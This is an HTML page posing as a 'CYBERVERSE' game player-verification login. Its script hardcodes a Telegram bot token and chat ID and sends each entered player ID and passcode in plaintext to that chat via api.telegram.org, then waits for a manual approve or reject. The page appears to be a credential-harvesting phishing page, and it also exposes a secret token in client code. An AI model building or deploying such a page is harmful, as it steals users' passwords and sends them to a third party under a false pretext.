<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYBERVERSE - Player Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0b0e14; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-card { background: #121824; border: 1px solid #1f293d; border-radius: 12px; padding: 30px 25px; width: 90%; max-width: 380px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); text-align: center; }
        .title { font-size: 22px; font-weight: 700; color: #38bdf8; letter-spacing: 1px; margin-bottom: 4px; }
        .subtitle { font-size: 11px; color: #64748b; letter-spacing: 1.5px; margin-bottom: 25px; }
        .form-group { text-align: left; margin-bottom: 18px; }
        label { display: block; font-size: 11px; color: #94a3b8; margin-bottom: 6px; letter-spacing: 0.5px; }
        input { width: 100%; padding: 12px; background: #1a2332; border: 1px solid #28354a; border-radius: 6px; color: #fff; font-size: 14px; outline: none; }
        input:focus { border-color: #38bdf8; }
        .btn-login { width: 100%; padding: 12px; background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%); border: none; border-radius: 6px; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; margin-top: 10px; }
        .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
        .status-msg { margin-top: 15px; font-size: 12px; color: #38bdf8; min-height: 18px; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="title">CYBERVERSE</div>
        <div class="subtitle">PLAYER VERIFICATION SYSTEM</div>

        <form id="loginForm">
            <div class="form-group">
                <label>PLAYER ID</label>
                <input type="text" id="playerId" placeholder="Enter Player ID" required>
            </div>
            <div class="form-group">
                <label>PASSCODE</label>
                <input type="password" id="passcode" placeholder="••••••" required>
            </div>
            <button type="submit" id="loginBtn" class="btn-login">LOGIN TO GAME</button>
        </form>

        <div id="statusMsg" class="status-msg"></div>
    </div>

    <script>
        // သင့်ရဲ့ Telegram Bot Credentials များ ထည့်သွင်းထားပါသည်
        const BOT_TOKEN = "8895720681:AAGuAuVf5qAwD3y84RiH7B3fEfBz9P1t_Hs"; 
        const ADMIN_CHAT_ID = "5304050102";   
        
        let userKey = "REQ_" + Math.floor(Math.random() * 90000 + 10000);

        const loginForm = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const statusMsg = document.getElementById('statusMsg');

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const playerId = document.getElementById('playerId').value.trim();
            const passcode = document.getElementById('passcode').value.trim();

            loginBtn.disabled = true;
            statusMsg.style.color = "#38bdf8";
            statusMsg.innerText = "Sending request to Admin Telegram...";

            const message = `🎮 *CyberVerse Login Request*\n\n👤 *Player ID:* \`${playerId}\`\n🔑 *Passcode:* \`${passcode}\`\n🆔 *Req ID:* \`${userKey}\``;

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [[
                                { text: "✅ Approve", callback_data: `ok_${userKey}` },
                                { text: "❌ Reject", callback_data: `no_${userKey}` }
                            ]]
                        }
                    })
                });

                if (response.ok) {
                    statusMsg.innerText = "Request Sent! Waiting for Admin Approval in Telegram...";
                    startPolling();
                } else {
                    statusMsg.style.color = "#ef4444";
                    statusMsg.innerText = "Error sending to Telegram. Did you press /start in the Bot?";
                    loginBtn.disabled = false;
                }
            } catch (err) {
                statusMsg.style.color = "#ef4444";
                statusMsg.innerText = "Network Error! Please turn on VPN and retry.";
                loginBtn.disabled = false;
            }
        });

        function startPolling() {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
                    const data = await res.json();
                    const lastUpdate = data.result?.[data.result.length - 1];
                    const callback = lastUpdate?.callback_query?.data;

                    if (callback === `ok_${userKey}`) {
                        clearInterval(interval);
                        statusMsg.style.color = "#10b981";
                        statusMsg.innerText = "✅ Request Approved! Access Granted.";
                        setTimeout(() => {
                            alert("Welcome to CyberVerse Game!");
                        }, 1000);
                    } else if (callback === `no_${userKey}`) {
                        clearInterval(interval);
                        statusMsg.style.color = "#ef4444";
                        statusMsg.innerText = "❌ Request Rejected by Admin.";
                        loginBtn.disabled = false;
                    }
                } catch (e) {
                    console.error("Polling error:", e);
                }
            }, 3000);
        }
    </script>
</body>
</html>
